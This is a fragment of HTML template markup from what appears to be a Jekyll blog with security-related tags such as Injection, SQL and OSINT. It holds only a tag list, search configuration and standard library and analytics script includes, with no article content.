<a class="post-tag" href="/tags/cursos/">Cursos</a> <a class="post-tag" href="/tags/injection/">Injection</a> <a class="post-tag" href="/tags/batch/">Batch</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/osint/">OSINT</a> <a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/termux/">termux</a> <a class="post-tag" href="/tags/windows/">Windows</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
